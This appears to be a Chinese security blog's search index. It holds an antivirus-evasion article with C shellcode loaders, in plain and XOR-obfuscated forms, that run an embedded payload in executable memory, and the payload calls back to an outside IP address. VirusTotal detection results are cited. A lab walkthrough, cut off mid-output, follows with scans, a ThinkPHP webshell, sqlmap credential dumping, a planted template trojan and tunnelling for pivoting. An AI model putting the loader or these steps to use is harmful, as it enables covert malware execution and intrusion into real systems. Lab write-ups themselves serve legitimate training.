x59\\x2f\\x77\\x80\\xfd\\x5e\\xcf\\x2a\\x6f\\x11\\xaf\\x89\\x83\\xa2\\x9d\\xc8\\x42\\xc7\\xb7\\x10\\xbb\\x4e\\x49\\x9d\\x5b\\xa1\\xcd\\xdd\\xc3\\xd2\\xb0\\xc6\\xf4\\xe6\\xa5\\xa1\\x33\\xa9\\x27\\xe3\\xe4\\x05\\x19\\x46\\xed\\xa6\\x61\\x2a\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x38\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x35\\x2e\\x31\\x3b\\x20\\x54\\x72\\x69\\x64\\x65\\x6e\\x74\\x2f\\x34\\x2e\\x30\\x29\\x0d\\x0a\\x00\\x50\\xd4\\xd0\\xc5\\x20\\x66\\x50\\x63\\x65\\x51\\x66\\x3e\\x79\\x15\\x7f\\x72\\x8d\\x2b\\x74\\x64\\xf5\\x1b\\x6c\\xdb\\x5b\\x7c\\x2c\\x37\\x9d\\xb1\\xa3\\xa8\\xc4\\x51\\x9b\\xfd\\x8d\\x68\\x42\\xe7\\x0b\\xd5\\x99\\xf2\\x42\\x77\\xaa\\xb0\\x4e\\x6c\\x54\\x39\\xe5\\x70\\xc8\\x06\\x9d\\xdc\\xe4\\xca\\x80\\x99\\x01\\x80\\xa4\\x23\\x34\\xc1\\x4a\\xa8\\xa6\\x27\\x54\\xf1\\xb3\\x70\\x34\\x49\\x6d\\xf5\\x41\\x70\\xe8\\xe0\\x65\\xbb\\x7c\\xf8\\xbd\\x64\\x0f\\xc8\\xf1\\x6c\\xed\\x76\\x66\\xa9\\xf1\\x0c\\x29\\x3f\\xd0\\xd0\\x93\\x9c\\x27\\xc2\\x74\\x22\\xd0\\x69\\xd0\\x6d\\x87\\xab\\x54\\x07\\x9d\\x4e\\xc2\\x60\\x65\\xbe\\xc5\\x2d\\xa5\\x7a\\xcc\\x48\\x49\\x6a\\xd0\\xa2\\xb6\\x7e\\x26\\x5e\\x09\\x2c\\xf8\\x9c\\x40\\x2c\\xf8\\x0e\\xfd\\x8d\\xf7\\x89\\xbe\\xd3\\x46\\x30\\x9e\\x94\\x93\\x15\\x2a\\xf5\\x55\\x66\\x3d\\xda\\xb7\\xc2\\x28\\xf3\\xf4\\xc5\\x3c\\x17\\x2d\\xc7\\xe9\\x2d\\xbe\\xd9\\x02\\x59\\xed\\x56\\x3a\\x7b\\xb1\\xbd\\x16\\xbc\\x25\\x43\\x52\\x36\\xb6\\x91\\x52\\x2f\\x28\\x91\\xc8\\x7b\\x10\\x3b\\x27\\x5d\\xb9\\x68\\xf6\\x7c\\x45\\x5d\\x2f\\x9b\\x59\\x23\\xeb\\x04\\x3e\\x8e\\xa2\\xdc\\x21\\x65\\xba\\xf3\\x28\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x38\\x2e\\x31\\x33\\x30\\x2e\\x33\\x35\\x2e\\x31\\x33\\x33\\x00\\x12\\x34\\x56\\x78\";\n\nint main()\n{\n    PVOID Memory;\n    // \u52a8\u6001\u5206\u914d\u865a\u62df\u5730\u5740\u7a7a\u95f4\n    Memory = VirtualAlloc(\n        NULL,                           // \u8ba9\u7cfb\u7edf\u9009\u62e9\u5185\u5b58\u57fa\u5740\n        sizeof(buf),                    // \u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\n        MEM_COMMIT | MEM_RESERVE,       // \u63d0\u4ea4\u5e76\u4fdd\u7559\u5185\u5b58\n        PAGE_EXECUTE_READWRITE          // \u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n        );\n\n    // \u590d\u5236\u5185\u5b58\u5185\u5bb9\uff0c\u5c06Shellcode\u590d\u5236\u5230\u65b0\u5206\u914d\u7684\u5185\u5b58\u4e2d\n    memcpy(Memory, buf, sizeof(buf));\n\n    // \u6267\u884cShellcode\uff0c\u5c06\u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u51fd\u6570\u6307\u9488\u5e76\u8c03\u7528\n    ((void(*)())Memory)();\n}\n</code></pre> <p></p> <p></p> <p>\u7f16\u8bd1\u6210\u529f\u540e\uff0c\u8fd0\u884c\uff1a</p> <p></p> <p>V\u7ad9\u67e5\u6740\u7ed3\u679c\uff1a</p> <p></p> <p>https://www.virustotal.com/gui/file/00b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0/detection</p> <p>\u8fd9\u4e2a\u6548\u679c\u5df2\u7ecf\u5f88\u597d\uff0c\u4f46\u662f\u6211\u60f3\u8981\u66f4\u597d\u3002</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article2/index.html#0x04","title":"0x04 \u5b9e\u73b0\u4e00\u6b21\u6df7\u6dc6\u52a0\u8f7d","text":"<p>\u4f7f\u7528\u4e4b\u524d\u7684Python\u811a\u672c\u6df7\u6dc6\u751f\u6210RAW\u6587\u4ef6\uff0c\u6700\u540e\u5f97\u5230\u6df7\u6dc6\u540e\u7684\u6570\u7ec4\uff1a</p> <pre><code>#include &lt;windows.h&gt;\n\n// \u5b9a\u4e49Shellcode\nunsigned char buf[] = \"\\xf6\\x42\\x89\\xee\\xfa\\xe2\\xc2\\x0a\\x0a\\x0a\\x4b\\x5b\\x4b\\x5a\\x58\\x5b\\x5c\\x42\\x3b\\xd8\\x6f\\x42\\x81\\x58\\x6a\\x42\\x81\\x58\\x12\\x42\\x81\\x58\\x2a\\x42\\x81\\x78\\x5a\\x42\\x05\\xbd\\x40\\x40\\x47\\x3b\\xc3\\x42\\x3b\\xca\\xa6\\x36\\x6b\\x76\\x08\\x26\\x2a\\x4b\\xcb\\xc3\\x07\\x4b\\x0b\\xcb\\xe8\\xe7\\x58\\x4b\\x5b\\x42\\x81\\x58\\x2a\\x81\\x48\\x36\\x42\\x0b\\xda\\x6c\\x8b\\x72\\x12\\x01\\x08\\x7f\\x78\\x81\\x8a\\x82\\x0a\\x0a\\x0a\\x42\\x8f\\xca\\x7e\\x6d\\x42\\x0b\\xda\\x5a\\x81\\x42\\x12\\x4e\\x81\\x4a\\x2a\\x43\\x0b\\xda\\xe9\\x5c\\x42\\xf5\\xc3\\x4b\\x81\\x3e\\x82\\x42\\x0b\\xdc\\x47\\x3b\\xc3\\x42\\x3b\\xca\\xa6\\x4b\\xcb\\xc3\\x07\\x4b\\x0b\\xcb\\x32\\xea\\x7f\\xfb\\x46\\x09\\x46\\x2e\\x02\\x4f\\x33\\xdb\\x7f\\xd2\\x52\\x4e\\x81\\x4a\\x2e\\x43\\x0b\\xda\\x6c\\x4b\\x81\\x06\\x42\\x4e\\x81\\x4a\\x16\\x43\\x0b\\xda\\x4b\\x81\\x0e\\x82\\x42\\x0b\\xda\\x4b\\x52\\x4b\\x52\\x54\\x53\\x50\\x4b\\x52\\x4b\\x53\\x4b\\x50\\x42\\x89\\xe6\\x2a\\x4b\\x58\\xf5\\xea\\x52\\x4b\\x53\\x50\\x42\\x81\\x18\\xe3\\x45\\xf5\\xf5\\xf5\\x57\\x60\\x0a\\x43\\xb4\\x7d\\x63\\x64\\x63\\x64\\x6f\\x7e\\x0a\\x4b\\x5c\\x43\\x83\\xec\\x46\\x83\\xfb\\x4b\\xb0\\x46\\x7d\\x2c\\x0d\\xf5\\xdf\\x42\\x3b\\xc3\\x42\\x3b\\xd8\\x47\\x3b\\xca\\x47\\x3b\\xc3\\x4b\\x5a\\x4b\\x5a\\x4b\\xb0\\x30\\x5c\\x73\\xad\\xf5\\xdf\\xe1\\x79\\x50\\x42\\x83\\xcb\\x4b\\xb2\\x9a\\x15\\x0a\\x0a\\x47\\x3b\\xc3\\x4b\\x5b\\x4b\\x5b\\x60\\x09\\x4b\\x5b\\x4b\\xb0\\x5d\\x83\\x95\\xcc\\xf5\\xdf\\xe1\\x53\\x51\\x42\\x83\\xcb\\x42\\x3b\\xd8\\x43\\x83\\xd2\\x47\\x3b\\xc3\\x58\\x62\\x0a\\x08\\x4a\\x8e\\x58\\x58\\x4b\\xb0\\xe1\\x5f\\x24\\x31\\xf5\\xdf\\x42\\x83\\xcc\\x42\\x89\\xc9\\x5a\\x60\\x00\\x55\\x42\\x83\\xfb\\x42\\x83\\xd0\\x43\\xcd\\xca\\xf5\\xf5\\xf5\\xf5\\x47\\x3b\\xc3\\x58\\x58\\x4b\\xb0\\x27\\x0c\\x12\\x71\\xf5\\xdf\\x8f\\xca\\x05\\x8f\\x97\\x0b\\x0a\\x0a\\x42\\xf5\\xc5\\x05\\x8e\\x86\\x0b\\x0a\\x0a\\xe1\\xd9\\xe3\\xee\\x0b\\x0a\\x0a\\xe2\\xa8\\xf5\\xf5\\xf5\\x25\\x69\\x3d\\x61\\x52\\x0a\\xb8\\x7d\\x15\\xc9\\x4a\\x30\\x31\\x1c\\x52\\x56\\x76\\xcb\\xa3\\xce\\xba\\x64\\xa3\\xc1\\x5e\\x4b\\xf6\\x64\\x86\\x16\\x29\\xd7\\xdd\\xc3\\x53\\xc1\\x55\\x44\\xde\\xd5\\xb6\\x22\\xae\\xe1\\x66\\x1c\\x54\\x81\\xf8\\x4d\\xfb\\xc7\\x5e\\x09\\xe0\\x94\\x73\\x3e\\xb0\\xeb\\x74\\x18\\x1c\\x00\\xbb\\x9d\\x64\\x6c\\xc2\\x7b\\x09\\x5d\\xd8\\xf1\\x00\\xd4\\xbb\\x02\\x62\\x0a\\x5f\\x79\\x6f\\x78\\x27\\x4b\\x6d\\x6f\\x64\\x7e\\x30\\x2a\\x47\\x65\\x70\\x63\\x66\\x66\\x6b\\x25\\x3f\\x24\\x3a\\x2a\\x22\\x69\\x65\\x67\\x7a\\x6b\\x7e\\x63\\x68\\x66\\x6f\\x31\\x2a\\x47\\x59\\x43\\x4f\\x2a\\x33\\x24\\x3a\\x31\\x2a\\x5d\\x63\\x64\\x6e\\x65\\x7d\\x79\\x2a\\x44\\x5e\\x2a\\x3c\\x24\\x3b\\x31\\x2a\\x5d\\x45\\x5d\\x3c\\x3e\\x31\\x2a\\x5e\\x78\\x63\\x6e\\x6f\\x64\\x7e\\x25\\x3f\\x24\\x3a\\x31\\x2a\\x48\\x45\\x43\\x4f\\x33\\x31\\x4f\\x44\\x5f\\x59\\x47\\x59\\x4f\\x23\\x07\\x00\\x0a\\xad\\xca\\x7a\\xaa\\x8d\\xe2\\x86\\x23\\x72\\x21\\xa5\\xda\\x0c\\x69\\x43\\xf8\\x93\\x49\\xba\\x17\\xe7\\xc0\\x70\\x37\\x31\\x59\\x8c\\x85\\x66\\xfb\\xee\\x61\\x07\\xb7\\x40\\x4e\\x61\\x77\\xac\\xdb\\x06\\x92\\xbb\\xf3\\xfa\\xac\\x35\\xed\\xf0\\x28\\xb4\\xe9\\xed\\x76\\xe9\\xcd\\x2d\\x84\\xb6\\xcb\\x9e\\xc7\\xe3\\x88\\xb4\\x25\\x4d\\x1b\\x60\\x0e\\x63\\x56\\x7e\\xdd\\xdf\\x6a\\xbc\\xc2\\x7c\\x6b\\xcc\\x25\\x89\\xc8\\x44\\x65\\x81\\x42\\x24\\x0b\\x65\\x44\\xd5\\xf4\\x92\\x46\\x12\\x2e\\x6c\\xf9\\x92\\x7c\\xf6\\x36\\x4f\\x94\\xb9\\x67\\x07\\xea\\xef\\x54\\x6b\\x5e\\xc7\\xbd\\x10\\x4b\\x10\\xf1\\x5b\\xce\\xcd\\xde\\x9c\\x74\\xda\\x83\\x21\\x27\\xdd\\xdc\\x93\\x1e\\xdc\\x9f\\xac\\x4a\\x74\\xd8\\x96\\x9f\\xe5\\x2e\\xb5\\xaf\\xa1\\xf2\\xff\\x41\\xfe\\x33\\x36\\xe4\\x4b\\x2f\\x56\\x3d\\xe3\\x58\\x8d\\x53\\x79\\x4c\\x31\\x13\\x70\\xd5\\xa5\\xd7\\x07\\xe4\\x04\\xc8\\x62\\xef\\x20\\x5e\\x19\\x47\\xd9\\x85\\x4d\\x9d\\xda\\x5d\\xfe\\x3c\\x73\\x80\\x1e\\x25\\x00\\x78\\x92\\x4a\\x92\\x2f\\x6c\\xd6\\x4e\\x20\\xe6\\x0a\\x4b\\xb4\\xfa\\xbf\\xa8\\x5c\\xf5\\xdf\\x42\\x3b\\xc3\\xb0\\x0a\\x0a\\x4a\\x0a\\x4b\\xb2\\x0a\\x1a\\x0a\\x0a\\x4b\\xb3\\x4a\\x0a\\x0a\\x0a\\x4b\\xb0\\x52\\xae\\x59\\xef\\xf5\\xdf\\x42\\x99\\x59\\x59\\x42\\x83\\xed\\x42\\x83\\xfb\\x42\\x83\\xd0\\x4b\\xb2\\x0a\\x2a\\x0a\\x0a\\x43\\x83\\xf3\\x4b\\xb0\\x18\\x9c\\x83\\xe8\\xf5\\xdf\\x42\\x89\\xce\\x2a\\x8f\\xca\\x7e\\xbc\\x6c\\x81\\x0d\\x42\\x0b\\xc9\\x8f\\xca\\x7f\\xdd\\x52\\x52\\x52\\x42\\x0f\\x0a\\x0a\\x0a\\x0a\\x5a\\xc9\\xe2\\x95\\xf7\\xf5\\xf5\\x32\\x24\\x3b\\x39\\x3a\\x24\\x39\\x3f\\x24\\x3b\\x39\\x39\\x0a\\x18\\x3e\\x5c\\x72\";\n\nint main()\n{\n    PVOID Memory;\n    // \u52a8\u6001\u5206\u914d\u865a\u62df\u5730\u5740\u7a7a\u95f4\n    Memory = VirtualAlloc(\n        NULL,                           // \u8ba9\u7cfb\u7edf\u9009\u62e9\u5185\u5b58\u57fa\u5740\n        sizeof(buf),                    // \u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\n        MEM_COMMIT | MEM_RESERVE,       // \u63d0\u4ea4\u5e76\u4fdd\u7559\u5185\u5b58\n        PAGE_EXECUTE_READWRITE          // \u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n        );\n\n    // \u590d\u5236\u5185\u5b58\u5185\u5bb9\uff0c\u5c06Shellcode\u590d\u5236\u5230\u65b0\u5206\u914d\u7684\u5185\u5b58\u4e2d\n    memcpy(Memory, buf, sizeof(buf));\n\n    // \u6267\u884cShellcode\uff0c\u5c06\u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u51fd\u6570\u6307\u9488\u5e76\u8c03\u7528\n    ((void(*)())Memory)();\n}\n</code></pre> <p>\u4e0a\u7ebf\u6548\u679c\uff1a</p> <p></p> <p>V\u7ad9\u67e5\u6740\uff1a</p> <p></p>"},{"location":"CTF/Emergency_response/index.html","title":"Emergency_response","text":""},{"location":"CTF/HTB/index.html","title":"HTB","text":"<ul> <li>Windows-Arctic</li> <li>Linux-SwagShop</li> <li>Linux-Usage</li> <li>Linux-Perfection</li> <li>Windows-Bastion</li> <li>Windows-Blue</li> <li>Windows-Bounty</li> <li>Windows-Granny</li> <li>Windows-Love</li> <li>Windows-Optimum</li> <li>Windows-Remote</li> <li>Windows-Aragog</li> <li>Windows-Arkham</li> <li>Windows-Bart</li> <li>Windows-Bastard</li> <li>Windows-Celestial</li> <li>Linux-Redcross</li> <li>Windows-SecNotes</li> <li>Windows-silo</li> <li>Windows-chatterbox</li> <li>CFS\u4e09\u5c42\u9776\u673a</li> <li>\u94c1\u4e09\u57df\u63a7</li> <li>\u7ea2\u65e5\u9776\u573a1</li> <li>\u7ea2\u65e5\u9776\u573a2</li> <li>\u7ea2\u65e5\u9776\u573a7</li> <li>Windows-Blazorized</li> <li>Linux-Sightless</li> <li>Linux-Me and My Girlfriend</li> <li>Linux-Baisc-Pentesting</li> </ul>"},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html","title":"CFS\u4e09\u5c42\u9776\u673a","text":"<p>\u9776\u673a\u5730\u5740\uff1ahttp://cloud-pentest.cn/index.html#;</p> <p>\u7f51\u7edc\u62d3\u6251\u56fe\uff1a</p> <p></p> <p></p> <p>\u5de5\u5177\u51c6\u5907:</p> <ul> <li>nmap</li> <li>fscan</li> <li>ThinkPHP_getshell-v2.exe ThinkPHP\u6f0f\u6d1e\u5229\u7528\u5de5\u5177</li> <li>\u8681\u5251</li> <li>proxychains4</li> <li>sqlmap</li> <li>Neo-regeorg</li> </ul> <p>\u653b\u51fb\u673a\u4fe1\u606f\uff1a</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 192.168.106.128  netmask 255.255.255.0  broadcast 192.168.106.255\n        inet6 fe80::20c:29ff:feab:94e2  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:0c:29:ab:94:e2  txqueuelen 1000  (Ethernet)\n        RX packets 6501061  bytes 3322102671 (3.0 GiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 4268971  bytes 583608839 (556.5 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8345  bytes 28506889 (27.1 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8345  bytes 28506889 (27.1 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\ntun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500\n        inet 10.8.0.170  netmask 255.255.255.255  destination 10.8.0.169\n        inet6 fe80::2fd9:634a:9163:51ff  prefixlen 64  scopeid 0x20&lt;link&gt;\n        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)\n        RX packets 38  bytes 4155 (4.0 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 2079  bytes 79733 (77.8 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre>"},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html#_1","title":"\u6e17\u900f\u6d41\u7a0b\uff1a","text":""},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html#17225013","title":"172.25.0.13","text":""},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html#nmap","title":"nmap","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# nmap -sn 172.25.0.1/24\nStarting Nmap 7.94 ( https://nmap.org ) at 2024-07-30 00:54 CST\nNmap scan report for 172.25.0.1\nHost is up (0.085s latency).\nNmap scan report for 172.25.0.13\nHost is up (0.16s latency).\nNmap done: 256 IP addresses (2 hosts up) scanned in 11.01 seconds\n</code></pre>"},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html#fscan","title":"fscan","text":"<p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9776\u673a172.25.0.13\u5b58\u6d3b\uff0c\u5e76\u5f00\u653e\u4e8622\uff0c80\uff0c21\u7b49\u7aef\u53e3\u3002</p> <p>\u8bbf\u95ee\u4e0b\u7f51\u7ad9\uff1a</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u662fThinkphp5.x\u6846\u67b6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u76f8\u5173exp\uff0c\u4e0b\u9762\u6211\u4eec\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u6f0f\u6d1e\u3002</p> <p></p> <p>\u76f4\u63a5\u638f\u51fa\u5de5\u5177\u626b\u4e00\u6ce2\uff0c\u5b58\u5728\u6f0f\u6d1e\u3002</p> <p></p> <p>\u5229\u7528\u8be5\u5de5\u5177\u5199\u5165shell\uff0c\u4e4b\u540e\u4f7f\u7528\u8681\u5251\u8fde\u63a5\u3002</p> <p></p> <p>\u8bbf\u95eephp\uff0c\u9a8c\u8bc1\u4e0a\u4f20shell\u6210\u529f\u3002</p> <p></p> <p>\u8681\u5251\u8fde\u63a5\u6210\u529f\u4e86</p> <p></p> <p>\u6210\u529f\u627e\u5230\u7b2c\u4e00\u4e2aflag\u3002</p> <p></p> <p>\u5148\u4fe1\u606f\u6536\u96c6\u4e00\u6ce2</p> <pre><code>\u67e5\u5185\u6838\nuname -an\n\u67e5ip\nifconfig\nip a\n\u67e5\u8def\u7531\nroute\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u5f53\u524d\u9776\u673a\u8fd8\u5904\u4e8e192.168.22\u7684\u7f51\u6bb5\u4e0b\uff0c\u4e0b\u9762\u6211\u4eec\u5efa\u7acb\u4ee3\u7406\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528neo-regeorg\uff0c\u4f7f\u7528\u7684\u4e3b\u8981\u547d\u4ee4\u5982\u4e0b\uff1a</p> <p></p> <p>\u9996\u5148\u751f\u6210\u901a\u9053\u6587\u4ef6\uff0ckey\u8bbe\u7f6e\u4e3apassword\uff0c\u4e4b\u540e\u5c06tunnel.php\u4e0a\u4f20\u5230\u7f51\u7ad9\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u4e0e\u6b64\u540c\u65f6\u6211\u4eec\u7684\u653b\u51fb\u673a\u4e0e\u901a\u9053\u6587\u4ef6\u5efa\u7acbsock5\u4ee3\u7406\u8fde\u63a5\u3002</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762/tools/Neo-reGeorg-5.2.0]\n\u2514\u2500# python neoreg.py generate -k password\n\n\n          \"$$$$$$''  'M$  '$$$@m\n        :$$$$$$$$$$$$$$''$$$$'\n       '$'    'JZI'$$&amp;  $$$$'\n                 '$$$  '$$$$\n                 $$$$  J$$$$'\n                m$$$$  $$$$,\n                $$$$@  '$$$$_          Neo-reGeorg\n             '1t$$$$' '$$$$&lt;\n          '$$$$$$$$$$'  $$$$          version 5.2.0\n               '@$$$$'  $$$$'\n                '$$$$  '$$$@\n             'z$$$$$$  @$$$\n                r$$$   $$|\n                '$$v c$$\n               '$$v $$v$$$$$$$$$#\n               $$x$$$$$$$$$twelve$$$@$'\n             @$$$@L '    '&lt;@$$$$$$$$`\n           $$                 '$$$\n\n\n    [ Github ] https://github.com/L-codes/Neo-reGeorg\n\n    [+] Create neoreg server files:\n       =&gt; neoreg_servers/tunnel.go\n       =&gt; neoreg_servers/tunnel.ashx\n       =&gt; neoreg_servers/tunnel.php\n       =&gt; neoreg_servers/tunnel.jspx\n       =&gt; neoreg_servers/tunnel.aspx\n       =&gt; neoreg_servers/tunnel.jsp\n\n\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762/tools/Neo-reGeorg-5.2.0]\n\u2514\u2500# python3 neoreg.py -k password  -u http://172.25.0.13/tunnel.php\n\n\n          \"$$$$$$''  'M$  '$$$@m\n        :$$$$$$$$$$$$$$''$$$$'\n       '$'    'JZI'$$&amp;  $$$$'\n                 '$$$  '$$$$\n                 $$$$  J$$$$'\n                m$$$$  $$$$,\n                $$$$@  '$$$$_          Neo-reGeorg\n             '1t$$$$' '$$$$&lt;\n          '$$$$$$$$$$'  $$$$          version 5.2.0\n               '@$$$$'  $$$$'\n                '$$$$  '$$$@\n             'z$$$$$$  @$$$\n                r$$$   $$|\n                '$$v c$$\n               '$$v $$v$$$$$$$$$#\n               $$x$$$$$$$$$twelve$$$@$'\n             @$$$@L '    '&lt;@$$$$$$$$`\n           $$                 '$$$\n\n\n    [ Github ] https://github.com/L-codes/Neo-reGeorg\n\n+------------------------------------------------------------------------+\n  Log Level set to [ERROR]\n  Starting SOCKS5 server [127.0.0.1:1080]\n  Tunnel at:\n    http://172.25.0.13/tunnel.php\n+------------------------------------------------------------------------+\n</code></pre> <p>\u4e0a\u4f20tunnel.php\u5230\u7f51\u7ad9\u6839\u76ee\u5f55\uff0c</p> <p></p> <p>\u5efa\u7acb\u6210\u529f\u540e\uff0c\u6211\u4eec\u4e0a\u4f20fscan_amd64\u5230\u8be5\u9776\u673a\uff0c\u8fdb\u884c\u7f51\u6bb5\u626b\u63cf\u3002</p> <pre><code>chmod 777 fscan_amd64\n\n./fscan_amd64\n</code></pre> <p>\u626b\u5230192.168.22.22\u3002</p> <p>\u4e4b\u540e\u8bbe\u7f6e\u706b\u72d0\u6d4f\u89c8\u5668\u4ee3\u7406\uff0c\u4f7f\u7528socks5\u8fdb\u884c\u8fde\u63a5\u3002</p> <p></p>"},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html#1921682222","title":"192.168.22.22","text":"<p>\u8bbf\u95ee\u6210\u529f\u3002</p> <p></p> <p>\u67e5\u770b/robots.txt</p> <p></p> <p>\u6839\u636e\u63d0\u793a\u53ef\u4ee5\u627e\u5230\u767b\u5f55\u754c\u9762http://192.168.22.22/index.php?r=admini/public/login</p> <p></p> <p>\u5c1d\u8bd5\u767b\u9646\u540e\uff0c\u53d1\u73b0\u8be5\u63a5\u53e3\u53ef\u80fd\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4f7f\u7528sqlmap\u8fdb\u884c\u6d4b\u8bd5\u3002</p> <pre><code>sqlmap -u \"http://192.168.22.22/index.php?r=vul&amp;keyword=1\" --batch --dbs --proxy=socks5://127.0.0.1:1080\n</code></pre> <p></p> <pre><code>sqlmap -u \"http://192.168.22.22/index.php?r=vul&amp;keyword=1\" --batch -D bagecms --tables  --proxy=socks5://127.0.0.1:1080\n</code></pre> <p></p> <pre><code>sqlmap -u \"http://192.168.22.22/index.php?r=vul&amp;keyword=1\" --batch -D bagecms -T bage_admin --columns  --proxy=socks5://127.0.0.1:1080\n</code></pre> <p></p> <pre><code>sqlmap -u \"http://192.168.22.22/index.php?r=vul&amp;keyword=1\" --batch -D bagecms -T bage_admin -C username,password --dump --proxy=socks5://127.0.0.1:1080\n</code></pre> <p></p> <p>\u6210\u529f\u767b\u5f55\u3002</p> <p></p> <p>\u6a21\u677f\u91cc\u9762\u53ef\u4ee5\u63d2\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\u3002</p> <p></p> <p>\u8bbf\u95ee\u9875\u9762\uff0c\u786e\u8ba4\u9a6curl\u7684\u8def\u5f84</p> <p></p> <p>\u8681\u5251\u8bbe\u7f6esock5\u4ee3\u7406</p> <p></p> <p>\u5c1d\u8bd5\u8fde\u63a5</p> <p></p> <p>\u4fe1\u606f\u641c\u96c6\uff0c\u6211\u4eec\u53d1\u73b0\u8be5\u9776\u673a\u8fd8\u5904\u4e8e192.168.33\u7684\u7f51\u6bb5\u3002</p> <p></p> <p>\u4e0a\u4f20neo\u5230\u7b2c\u4e00\u53f0\u9776\u673a\u4e2d\uff0c\u5e76\u5c06\u751f\u6210\u7684tunnel.php\u4e0a\u4f20\u5230192.168.22.22\u9776\u673a\u4e2d\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u53ef\u4ee5\u5148\u67e5\u770b\u4e00\u4e0b172.25.0.13\u9776\u673a\u80fd\u4e0d\u80fd\u7528python\uff0c\u6709\u6ca1\u6709python\u73af\u5883</p> <p></p> <p>\u7136\u540e\u5f00\u542f\u4ee3\u7406\u5efa\u7acb\u8fde\u63a5\u3002</p> <pre><code>python neoreg.py -k password -u http://192.168.22.22/tunnel.php -l 0.0.0.0 -p 2001\n</code></pre> <p></p>"},{"location":"CTF/HTB/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/index.html#1921683333","title":"192.168.33.33","text":"<p>\u4ee5T2\u4e3a\u8df3\u677f\u8bbf\u95eeT3\uff0c\u6211\u4eec\u5728\u653b\u51fb\u673a\u4f7f\u7528nmap\u626b\u63cf33\u7f51\u6bb5 \u3002</p> <pre><code>proxychains4 nmap -Pn -sT 192.168.33.0/24       //\u626b\u63cf\u7684\u5b9e\u5728\u592a\u6162\u4e86\n</code></pre> <p>\u6211\u4eec\u76f4\u63a5\u5bf9\u5185\u7f5133.33\u670d\u52a1\u5668\u8fdb\u884c\u626b\u63cf\uff1a</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# proxychains nmap -Pn -sT -sV 192.168.33.33 -p 445,3389\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading 